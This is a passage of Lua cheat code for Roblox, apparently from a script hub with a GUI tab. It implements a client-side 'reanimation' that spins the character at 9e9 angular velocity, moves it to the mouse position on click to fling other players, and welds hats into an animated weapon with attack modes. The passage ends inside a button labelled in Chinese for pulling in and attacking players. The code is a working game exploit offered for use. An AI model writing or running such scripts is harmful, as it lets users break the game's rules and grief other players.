i(b['Head'],y['Head'])i(b['Torso'],y['Torso'])j(b['HumanoidRootPart'],y['Torso'],Vector3.new(0,0,0))i(b['Right Arm'],y['Right Arm'])i(b['Left Arm'],y['Left Arm'])i(b['Right Leg'],y['Right Leg'])i(b['Left Leg'],y['Left Leg'])k=a:GetMouse()local z=Instance.new("Part",g)z.CanCollide=false z.Transparency=1 d(c,x.RenderStepped:Connect(function()local D=workspace.CurrentCamera.CFrame.lookVector local E=y["HumanoidRootPart"]z.Position=E.Position z.CFrame=CFrame.new(z.Position,Vector3.new(D.X*10000,D.Y,D.Z*10000))end))l=false m=false n=false o=false p=false function q(D)r=Instance.new('BodyAngularVelocity',D)r.AngularVelocity=Vector3.new(9e9,9e9,9e9)r.MaxTorque=Vector3.new(9e9,9e9,9e9)end q(b.HumanoidRootPart)k=a:GetMouse()s=Instance.new('BodyPosition',b.HumanoidRootPart)s.P=9e9 s.D=9e9 s.MaxForce=Vector3.new(99999,99999,99999)local A d(c,x.Heartbeat:Connect(function()if A==true then s.Position=k.Hit.p b.HumanoidRootPart.Position=k.Hit.p else s.Position=y.Torso.Position b.HumanoidRootPart.Position=y.Torso.Position end end))local B=Instance.new("SelectionBox")B.Adornee=b.HumanoidRootPart B.LineThickness=0.02 B.Color3=Color3.fromRGB(250,0,0)B.Parent=b.HumanoidRootPart B.Name="RAINBOW"t=B if clickfling then d(c,k.Button1Down:Connect(function()A=true end))d(c,k.Button1Up:Connect(function()A=false end))end d(c,k.KeyDown:Connect(function(D)if D==' 'then p=true end if D=='w'then l=true end if D=='s'then m=true end if D=='a'then n=true end if D=='d'then o=true end end))d(c,k.KeyUp:Connect(function(D)if D==' 'then p=false end if D=='w'then l=false end if D=='s'then m=false end if D=='a'then n=false end if D=='d'then o=false end end))local function C(D,E,F)z.CFrame=z.CFrame*CFrame.new(-D,E,-F)y.Humanoid.WalkToPoint=z.Position end d(c,x.RenderStepped:Connect(function()if l==true then C(0,0,1e4)end if m==true then C(0,0,-1e4)end if n==true then C(1e4,0,0)end if o==true then C(-1e4,0,0)end if p==true then y.Humanoid.Jump=true end if l~=true and n~=true and m~=true and o~=true then y.Humanoid.WalkToPoint=y.HumanoidRootPart.Position end end))workspace.CurrentCamera.CameraSubject=y.Humanoid u=Instance.new('BindableEvent')d(c,u.Event:Connect(function()y:Destroy()e=true v=false for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then E.Anchored=true end end w=b.Humanoid:Clone()b.Humanoid:Destroy()w.Parent=b game.Players:Chat('-re')for D,E in pairs(c)do E:Disconnect()end game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)u:Remove()end))game:GetService("StarterGui"):SetCore("ResetButtonCallback",u)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = workspace.Camera.CameraSubject.Parent

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == '1' then-- first mode
Mode='1'
elseif k == 'e' then-- second mode
Mode='2'
elseif k == 'q' then-- first mode again
Mode='1'
end
end)

attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
Mode='Attack1'
wait(1) -- time of attack u can edit this
Mode='Attack2'
wait(1)
Mode='Attack3'
wait(0.07)
Mode ='1' -- change this mode to whatever u want the mode to be after attacking
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.y > 1 then -- jump

elseif Root.Velocity.y < -1 then -- fall

elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == '2' then
if Root.Velocity.y > 1 then -- jump
elseif Root.Velocity.y < -1 then -- fall
elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == 'Attack1' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.14+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+89.64*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack2' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.14+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+89.64*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack3' then --attack clerp 

end
srv.RenderStepped:Wait()
end
end)()

  	end    

})

Tab:AddButton({

	Name = "吸人（可攻击）",

	Callback = function()

     -- 你必须有一把剑才能正常发挥.
